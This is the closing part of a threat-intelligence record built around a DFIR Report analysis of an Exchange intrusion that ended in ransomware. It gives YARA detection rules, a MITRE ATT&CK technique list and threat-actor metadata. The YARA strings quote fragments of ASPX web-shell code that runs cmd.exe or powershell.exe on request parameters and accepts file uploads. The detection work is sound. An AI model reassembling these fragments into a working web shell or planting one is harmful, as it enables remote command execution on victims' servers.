Date: 2021-11-14\n  Identifier: 6898\n  Reference: https://thedfirreport.com\n*/\n/* Rule Set ----------------------------------------------------------------- */\nimport \"pe\"\nrule sig_6898_login_webshell {\n  meta:\n   description = \"6898 - file login.aspx\"\n   author = \"The DFIR Report\"\n   reference = \"https://thedfirreport.com\"\n   date = \"2021-11-14\"\n   hash1 = \"98ccde0e1a5e6c7071623b8b294df53d8e750ff2fa22070b19a88faeaa3d32b0\"\n  strings:\n   $s1 = \"<asp:TextBox id='xpath' runat='server'\nWidth='300px'>c:\\\\windows\\\\system32\\\\cmd.exe</asp:TextBox>    \" fullword ascii\n   $s2 = \"myProcessStartInfo.UseShellExecute = false      \" fullword ascii\n   $s3 = \"\\\"Microsoft.Exchange.ServiceHost.exe0r\" fullword ascii\n   $s4 = \"myProcessStartInfo.Arguments=xcmd.text      \" fullword ascii\n   $s5 = \"myProcess.StartInfo = myProcessStartInfo      \" fullword ascii\n   $s6 = \"myProcess.Start()      \" fullword ascii\n   $s7 = \"myProcessStartInfo.RedirectStandardOutput = true      \" fullword\nascii\n   $s8 = \"myProcess.Close()            \" fullword ascii\n   $s9 = \"Dim myStreamReader As StreamReader = myProcess.StandardOutput      \n\" fullword ascii\n   $s10 = \"<%@ import Namespace='system.IO' %>\" fullword ascii\n   $s11 = \"<%@ import Namespace='System.Diagnostics' %>\" fullword ascii\n   $s12 = \"Dim myProcess As New Process()      \" fullword ascii\n   $s13 = \"Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)      \"\nfullword ascii\n   $s14 = \"example.org0\" fullword ascii\n   $s16 = \"<script runat='server'>   \" fullword ascii\n   $s17 = \"<asp:TextBox id='xcmd' runat='server' Width='300px' Text='/c whoami'>/c\nwhoami</asp:TextBox>    \" fullword ascii\n   $s18 = \"<p><asp:Button id='Button' onclick='runcmd' runat='server'\nWidth='100px' Text='Run'></asp:Button>    \" fullword ascii\n   $s19 = \"Sub RunCmd()      \" fullword ascii\n  condition:\n   uint16(0) == 0x8230 and filesize < 6KB and\n   8 of them\n}\nrule aspx_gtonvbgidhh_webshell {\n  meta:\n   description = \"6898 - file aspx_gtonvbgidhh.aspx\"\n   author = \"The DFIR Report\"\n   reference = \"https://thedfirreport.com\"\n   date = \"2021-11-14\"\n\n```\n\n-----\n\n```\n   hash1 dc4186dd9b3a4af8565f87a9a799644fce8af25e3ee8777d90ae660d48497a04 \n  strings:\n   $s1 = \"info.UseShellExecute = false;\" fullword ascii\n   $s2 = \"info.Arguments = \\\"/c \\\" + command;\" fullword ascii\n   $s3 = \"var dstFile = Path.Combine(dstDir,\nPath.GetFileName(httpPostedFile.FileName));\" fullword ascii\n   $s4 = \"info.FileName = \\\"powershell.exe\\\";\" fullword ascii\n   $s5 = \"using (StreamReader streamReader = process.StandardError)\" fullword\nascii\n   $s6 = \"return httpPostedFile.FileName + \\\" Uploaded to: \\\" + dstFile;\" fullword\nascii\n   $s7 = \"httpPostedFile.InputStream.Read(buffer, 0, fileLength);\" fullword ascii\n   $s8 = \"int fileLength = httpPostedFile.ContentLength;\" fullword ascii\n   $s9 = \"result = result + Environment.NewLine + \\\"ERROR:\\\" +\nEnvironment.NewLine + error;\" fullword ascii\n   $s10 = \"ALAAAAAAAAAAA\" fullword ascii /* base64 encoded string ',' */\n   $s11 =\n\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\nascii /* base64 encoded string '' */\n   $s12 = \"var result = delimiter + this.RunIt(Request.Params[\\\"exec_code\\\"]) +\ndelimiter;\" fullword ascii\n   $s13 = \"AAAAAAAAAAAAAAAAAAAAAAAA6AAAAAAAAAAAAAAA\" ascii /* base64 encoded\nstring ':' */\n   $s14 = \"using (StreamReader streamReader = process.StandardOutput)\" fullword\nascii\n   $s15 = \"private string RunIt(string command)\" fullword ascii\n   $s16 = \"Process process = Process.Start(info);\" fullword ascii\n   $s17 = \"ProcessStartInfo info = new ProcessStartInfo();\" fullword ascii\n   $s18 = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6\" ascii /* base64 encoded\nstring ':' */\n   $s19 = \"6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\nascii /* base64 encoded string '' */\n   $s20 = \"if (Request.Params[\\\"exec_code\\\"] == \\\"put\\\")\" fullword ascii\n  condition:\n   uint16(0) == 0x4221 and filesize < 800KB and\n   8 of them\n}\nrule aspx_qdajscizfzx_webshell {\n  meta:\n   description = \"6898 - file aspx_qdajscizfzx.aspx\"\n   author = \"The DFIR Report\"\n   reference = \"https://thedfirreport.com\"\n   date = \"2021-11-14\"\n   hash1 = \"60d22223625c86d7f3deb20f41aec40bc8e1df3ab02cf379d95554df05edf55c\"\n  strings:\n   $s1 = \"info.FileName = \\\"cmd.exe\\\";\" fullword ascii\n   $s2 = \"info.UseShellExecute = false;\" fullword ascii\n   $s3 = \"info.Arguments = \\\"/c \\\" + command;\" fullword ascii\n   $s4 = \"var dstFile = Path.Combine(dstDir,\nPath.GetFileName(httpPostedFile.FileName));\" fullword ascii\n   $s5 = \"using (StreamReader streamReader = process.StandardError)\" fullword\nascii\n   $s6 = \"return httpPostedFile.FileName + \\\" Uploaded to: \\\" + dstFile;\" fullword\nascii\n\n```\n\n-----\n\n```\n   $s7 httpPostedFile.InputStream.Read(buffer, 0, fileLength); fullword ascii\n   $s8 = \"int fileLength = httpPostedFile.ContentLength;\" fullword ascii\n   $s9 = \"result = result + Environment.NewLine + \\\"ERROR:\\\" +\nEnvironment.NewLine + error;\" fullword ascii\n   $s10 = \"ALAAAAAAAAAAA\" fullword ascii /* base64 encoded string ',' */\n   $s11 =\n\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\nascii /* base64 encoded string '' */\n   $s12 = \"var result = delimiter + this.RunIt(Request.Params[\\\"exec_code\\\"]) +\ndelimiter;\" fullword ascii\n   $s13 = \"AAAAAAAAAAAAAAAAAAAAAAAA6AAAAAAAAAAAAAAA\" ascii /* base64 encoded\nstring ':' */\n   $s14 = \"using (StreamReader streamReader = process.StandardOutput)\" fullword\nascii\n   $s15 = \"private string RunIt(string command)\" fullword ascii\n   $s16 = \"Process process = Process.Start(info);\" fullword ascii\n   $s17 = \"ProcessStartInfo info = new ProcessStartInfo();\" fullword ascii\n   $s18 = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6\" ascii /* base64 encoded\nstring ':' */\n   $s19 = \"6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\nascii /* base64 encoded string '' */\n   $s20 = \"if (Request.Params[\\\"exec_code\\\"] == \\\"put\\\")\" fullword ascii\n  condition:\n   uint16(0) == 0x4221 and filesize < 800KB and\n   8 of them\n}\nrule sig_6898_dcrypt {\n  meta:\n   description = \"6898 - file dcrypt.exe\"\n   author = \"The DFIR Report\"\n   reference = \"https://thedfirreport.com\"\n   date = \"2021-11-14\"\n   hash1 = \"02ac3a4f1cfb2723c20f3c7678b62c340c7974b95f8d9320941641d5c6fd2fee\"\n  strings:\n   $s1 = \"For more detailed information, please visit\nhttp://www.jrsoftware.org/ishelp/index.php?topic=setupcmdline\" fullword wide\n   $s2 = \"Causes Setup to create a log file in the user's TEMP directory.\"\nfullword wide\n   $s3 = \"Prevents the user from cancelling during the installation process.\"\nfullword wide\n   $s4 = \"/http://crl4.digicert.com/sha2-assured-cs-g1.crl0L\" fullword ascii\n   $s5 = \"Same as /LOG, except it allows you to specify a fixed path/filename to\nuse for the log file.\" fullword wide\n   $s6 = \"/PASSWORD=password\" fullword wide\n   $s7 = \"The Setup program accepts optional command line parameters.\" fullword\nwide\n   $s8 = \"Overrides the default component settings.\" fullword wide\n   $s9 = \"Specifies the password to use.\" fullword wide\n   $s10 = \"/MERGETASKS=\\\"comma separated list of task names\\\"\" fullword wide\n   $s11 = \"Instructs Setup to load the settings from the specified file after\nhaving checked the command line.\" fullword wide\n   $s12 = \"/DIR=\\\"x:\\\\dirname\\\"\" fullword wide\n   $s13 = \"http://diskcryptor.org/                   \" fullword\nwide\n\n```\n\n-----\n\n```\n   $s14 Prevents Setup from restarting the system following a successful\ninstallation, or after a Preparing to Install failure that requ\" wide\n   $s15 = \"HBPLg.sse\" fullword ascii\n   $s16 = \"/LOG=\\\"filename\\\"\" fullword wide\n   $s17 = \"Overrides the default folder name.\" fullword wide\n   $s18 = \"Overrides the default setup type.\" fullword wide\n   $s19 = \"Overrides the default directory name.\" fullword wide\n   $s20 = \"* AVz'\" fullword ascii\n  condition:\n   uint16(0) == 0x5a4d and filesize < 5000KB and\n   ( pe.imphash() == \"48aa5c8931746a9655524f67b25a47ef\" or 8 of them )\n}\n\n## MITRE\n\n#### Exploit Public-Facing Application – T1190 OS Credential Dumping – T1003 Network Service Scanning – T1046 Remote Desktop Protocol – T1021.001 Account Manipulation – T1098 Valid Accounts – T1078 Protocol Tunneling – T1572 Ingress Tool Transfer – T1105 Match Legitimate Name or Location – T1036.005 Windows Service – T1543.003 Data Encrypted for Impact – T1486 Web Shell – T1505.003 System Information Discovery – T1082 System Network Configuration Discovery – T1016 System Owner/User Discovery – T1033 Windows Command Shell – T1059.003\n\n### Internal case #6898\n\n```\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-11-15 - Exchange Exploit Leads to Domain Wide Ransomware.pdf"
+    ],
+    "report_names": [
+        "2021-11-15 - Exchange Exploit Leads to Domain Wide Ransomware.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "82b92285-4588-48c9-8578-bb39f903cf62",
+            "created_at": "2022-10-25T15:50:23.850506Z",
+            "updated_at": "2025-03-27T02:00:55.501372Z",
+            "deleted_at": null,
+            "main_name": "Charming Kitten",
+            "aliases": [
+                "Charming Kitten"
+            ],
+            "source_name": "MITRE:Charming Kitten",
+            "tools": [
+                "DownPaper"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
+            "created_at": "2022-10-25T16:07:23.773944Z",
+            "updated_at": "2025-03-27T02:02:09.974695Z",
+            "deleted_at": null,
+            "main_name": "Lead",
+            "aliases": [
+                "Casper",
+                "TG-3279"
+            ],
+            "source_name": "ETDA:Lead",
+            "tools": [
+                "Agentemis",
+                "BleDoor",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "RbDoor",
+                "RibDoor",
+                "Winnti",
+                "cobeacon"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "e034b94b-9655-42c4-a72e-a58807dce299",
+            "created_at": "2022-10-25T16:07:24.133537Z",
+            "updated_at": "2025-03-27T02:02:10.118581Z",
+            "deleted_at": null,
+            "main_name": "Rocket Kitten",
+            "aliases": [
+                "Group 83",
+                "NewsBeef",
+                "Newscaster",
+                "Operation Newscaster",
+                "Operation Woolen-GoldFish",
+                "Parastoo",
+                "Rocket Kitten"
+            ],
+            "source_name": "ETDA:Rocket Kitten",
+            "tools": [
+                "CoreImpact (Modified)",
+                "FireMalv",
+                "Ghole",
+                "Gholee"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "610a7295-3139-4f34-8cec-b3da40add480",
+            "created_at": "2023-01-06T13:46:38.608142Z",
+            "updated_at": "2025-03-27T02:00:02.87217Z",
+            "deleted_at": null,
+            "main_name": "Cobalt",
+            "aliases": [
+                "Cobalt Gang",
+                "GOLD KINGSWOOD",
+                "COBALT SPIDER",
+                "G0080",
+                "Mule Libra",
+                "Cobalt Group"
+            ],
+            "source_name": "MISPGALAXY:Cobalt",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "ae26d287-8ba7-447e-9391-cf13c02d7481",
+            "created_at": "2023-03-04T02:01:54.0962Z",
+            "updated_at": "2025-03-27T02:00:03.120665Z",
+            "deleted_at": null,
+            "main_name": "TA453",
+            "aliases": [],
+            "source_name": "MISPGALAXY:TA453",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "d8af157e-741b-4933-bb4a-b78490951d97",
+            "created_at": "2023-01-06T13:46:38.748929Z",
+            "updated_at": "2025-03-27T02:00:02.908256Z",
+            "deleted_at": null,
+            "main_name": "APT35",
+            "aliases": [
+                "Newscaster Team",
+                "Magic Hound",
+                "G0059",
+                "Phosphorus",
+                "Mint Sandstorm",
+                "TunnelVision",
+                "COBALT MIRAGE"
+            ],
+            "source_name": "MISPGALAXY:APT35",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "04888f75-158b-47f9-8ad9-4ff83f618ece",
+            "created_at": "2024-05-01T02:03:08.03763Z",
+            "updated_at": "2025-03-27T02:05:17.319276Z",
+            "deleted_at": null,
+            "main_name": "COBALT MIRAGE",
+            "aliases": [
+                "Nemesis Kitten ",
+                "PHOSPHORUS ",
+                "TunnelVision ",
+                "UNC2448 ",
+                "DEV-0270 "
+            ],
+            "source_name": "Secureworks:COBALT MIRAGE",
+            "tools": [
+                " Custom powershell scripts",
+                " DiskCryptor",
+                " Drokbk",
+                " FRPC",
+                " Fast Reverse Proxy (FRP)",
+                " Impacket wmiexec",
+                " Ngrok",
+                " Plink",
+                " PowerLessCLR",
+                " TunnelFish",
+                "BitLocker"
+            ],
+            "source_id": "Secureworks",
+            "reports": null
+        },
+        {
+            "id": "029625d2-9734-44f9-9e10-b894b4f57f08",
+            "created_at": "2023-01-06T13:46:38.364105Z",
+            "updated_at": "2025-03-27T02:00:02.815023Z",
+            "deleted_at": null,
+            "main_name": "Charming Kitten",
+            "aliases": [
+                "Parastoo",
+                "iKittens",
+                "Group 83",
+                "NewsBeef",
+                "G0058",
+                "CharmingCypress"
+            ],
+            "source_name": "MISPGALAXY:Charming Kitten",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "08a3b64c-8e18-455d-af57-28dca63808c4",
+            "created_at": "2024-05-01T02:03:08.027871Z",
+            "updated_at": "2025-03-27T02:05:17.313679Z",
+            "deleted_at": null,
+            "main_name": "COBALT ILLUSION",
+            "aliases": [
+                "APT42 ",
+                "Charming Kitten ",
+                "CharmingCypress ",
+                "ITG18 ",
+                "Magic Hound ",
+                "Mint Sandstorm sub-group ",
+                "NewsBeef ",
+                "Newscaster ",
+                "PHOSPHORUS sub-group ",
+                "TA453 ",
+                "UNC788 ",
+                "Yellow Garuda ",
+                "APT35 "
+            ],
+            "source_name": "Secureworks:COBALT ILLUSION",
+            "tools": [
+                " MagicHound Toolset",
+                " PupyRAT",
+                "Browser Exploitation Framework (BeEF)"
+            ],
+            "source_id": "Secureworks",
+            "reports": null
+        },
+        {
+            "id": "e3676dfe-3d40-4b3a-bfbd-4fc1f8c896f4",
+            "created_at": "2022-10-25T15:50:23.808974Z",
+            "updated_at": "2025-03-27T02:00:55.550912Z",
+            "deleted_at": null,
+            "main_name": "Magic Hound",
+            "aliases": [
+                "Magic Hound",
+                "TA453",
+                "COBALT ILLUSION",
+                "Charming Kitten",
+                "ITG18",
+                "Phosphorus",
+                "APT35",
+                "Mint Sandstorm"
+            ],
+            "source_name": "MITRE:Magic Hound",
+            "tools": [
+                "Impacket",
+                "CharmPower",
+                "FRP",
+                "Mimikatz",
+                "Systeminfo",
+                "ipconfig",
+                "netsh",
+                "PowerLess",
+                "Pupy",
+                "DownPaper",
+                "PsExec",
+                "Havij",
+                "sqlmap"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "1699fb41-b83f-42ff-a6ec-984ae4a1031f",
+            "created_at": "2022-10-25T16:07:23.83826Z",
+            "updated_at": "2025-03-27T02:02:09.995863Z",
+            "deleted_at": null,
+            "main_name": "Magic Hound",
+            "aliases": [
+                "APT 35",
+                "Ballistic Bobcat",
+                "Charming Kitten",
+                "CharmingCypress",
+                "Cobalt Illusion",
+                "Cobalt Mirage",
+                "Educated Manticore",
+                "Magic Hound",
+                "Mint Sandstorm",
+                "Operation BadBlood",
+                "Operation Sponsoring Access",
+                "Operation SpoofedScholars",
+                "Operation Thamar Reservoir",
+                "Phosphorus",
+                "TA453",
+                "TEMP.Beanie",
+                "Tarh Andishan",
+                "Timberworm",
+                "TunnelVision",
+                "UNC788",
+                "Yellow Garuda"
+            ],
+            "source_name": "ETDA:Magic Hound",
+            "tools": [
+                "7-Zip",
+                "AnvilEcho",
+                "BASICSTAR",
+                "CORRUPT KITTEN",
+                "CWoolger",
+                "CharmPower",
+                "ChromeHistoryView",
+                "CommandCam",
+                "DistTrack",
+                "DownPaper",
+                "FRP",
+                "Fast Reverse Proxy",
+                "FireMalv",
+                "Ghambar",
+                "GoProxy",
+                "GorjolEcho",
+                "HYPERSCRAPE",
+                "Havij",
+                "MPK",
+                "MPKBot",
+                "Matryoshka",
+                "Matryoshka RAT",
+                "MediaPl",
+                "Mimikatz",
+                "MischiefTut",
+                "NETWoolger",
+                "NOKNOK",
+                "PINEFLOWER",
+                "POWERSTAR",
+                "PowerLess Backdoor",
+                "PsList",
+                "Pupy",
+                "PupyRAT",
+                "SNAILPROXY",
+                "Shamoon",
+                "TDTESS",
+                "WinRAR",
+                "WoolenLogger",
+                "Woolger",
+                "pupy",
+                "sqlmap"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535794,
+    "ts_updated_at": 1743041771,
+    "ts_creation_date": 1653488401,
+    "ts_modification_date": 1653488401,
+    "files": {
+        "pdf": "https://archive.orkl.eu/36319a08ddffe3852cf999681836220d594fe97a.pdf",
+        "text": "https://archive.orkl.eu/36319a08ddffe3852cf999681836220d594fe97a.txt",
+        "img": "https://archive.orkl.eu/36319a08ddffe3852cf999681836220d594fe97a.jpg"
+    }
+}
